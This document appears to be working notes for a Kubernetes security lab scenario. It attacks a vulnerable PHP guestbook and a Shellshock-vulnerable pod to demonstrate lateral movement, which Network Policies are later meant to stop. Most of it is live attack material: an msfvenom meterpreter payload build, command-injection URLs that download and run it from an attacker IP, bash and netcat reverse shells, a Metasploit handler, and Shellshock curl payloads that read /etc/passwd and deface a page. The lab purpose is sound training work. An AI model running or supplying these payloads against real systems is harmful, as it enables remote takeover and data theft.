> :memo: NOTE
>
> This attack scenario consist of mainly two steps taken from existing scenarios available on the web:
> * [Attacking Kubernetes Episode 1 by Jay Beal](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)
> * [Running a compromised pod by Liz Rice](https://tutorial.kubernetes-security.info/compromise/)
>
> HOWEVER, **substantial** changes were needed to make these examples suitable to our scenario. In addition, all the content regarding Network Policies had to be adapted to our needs.

The attack scenario will be described next.

Having several workloads in a cluster without support for Network Policies, lateral movement can be carried out in 2 ways:
* East-West (move through the internal Network of Pods)
* North-South (move out of the cluster -Egress Traffic-)

The idea of this attack, and later remediation will be to illustrate how an attacker can perform such malicious actions and how to prevent it by enforcing proper Network Policies.

# Cluster setup

## Setting up vulnerable PHP Guestbook

> :memo: NOTE
>
> This vulnerable workload will be the Initial Access.

References:
* list of references here

PHP Guestbook:
https://kubernetes.io/docs/tutorials/stateless-application/guestbook/

NetworkPolicies for PHP Guestbook:
https://betterprogramming.pub/k8s-network-policy-made-simple-with-cilium-editor-a5b55781291c

Exploitation for Initial Access:
https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/


https://hub.docker.com/search?q=jaybeale&type=image
https://hub.docker.com/r/jaybeale/guestbook-frontend-with-statusphp-vuln

-------------------------------------------------------

$ msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.124 LPORT=4444 -e x64/zutto_dekiru -o rshell -f elf

download 'rshell' file
http://localhost:8080/guestbook.php?cmd=set&key=command&value=curl http://192.168.1.124:8888/rshell

add execution permissions to 'rshell'
http://localhost:8080/guestbook.php?cmd=set&key=command&value=chmod 755 rshell

execute 'rshell'
http://localhost:8080/guestbook.php?cmd=set&key=command&value=./rshell

-------------------------------------------------------

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://security.stackexchange.com/questions/159279/segmentation-fault-in-shellcode


https://github.com/egernst/gb-frontend-kata
https://github.com/GoogleCloudPlatform/kubernetes-engine-samples/blob/master/guestbook/php-redis/Dockerfile



http://localhost:8080/guestbook.php?cmd=set&key=command&value=bash -i >& /dev/tcp/192.168.1.124/4444 0>&1

http://localhost:8080/guestbook.php?cmd=set&key=command&value=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.124 4444 >/tmp/f

http://localhost:8080/guestbook.php?cmd=set&key=command&value=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 192.168.1.124 4444 >/tmp/f



use exploit/multi/handler
set payload
set LHOST 0.0.0.0
run

## Setting up a Shellshockable workload

https://github.com/aquasecurity/shellshockable
helm template vuln-bash tmp/shellshockable > deployments/shellshockable/shellshockable.yaml
https://github.com/lizrice/shellshockable/blob/master/Dockerfile

# Lateral movement

## Getting a reverse shell on

## Shellshock vulnerability

* https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271)
* https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/

-----------------------------------------------------

Basic recon:

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/hostname" vuln-bash-shellshockable/cgi-bin/shockme.cgi

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/os-release" vuln-bash-shellshockable/cgi-bin/shockme.cgi

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/whoami" vuln-bash-shellshockable/cgi-bin/shockme.cgi

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" vuln-bash-shellshockable/cgi-bin/shockme.cgi

----------

Uploading content to the server

curl vuln-bash-shellshockable/ryuzakyl.html

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo 'You have been pwned' > /var/www/html/ryuzakyl.html" vuln-bash-shellshockable/cgi-bin/shockme.cgi

----------

Outside connectivity

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/ping -c 4 www.google.com" vuln-bash-shellshockable/cgi-bin/shockme.cgi

----------

Other tests

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; ls -la" vuln-bash-shellshockable/cgi-bin/shockme.cgi

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/wget http://worldtimeapi.org/api/timezone/Europe/London.txt" vuln-bash-shellshockable/cgi-bin/shockme.cgi

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat ./London.txt" vuln-bash-shellshockable/cgi-bin/shockme.cgi
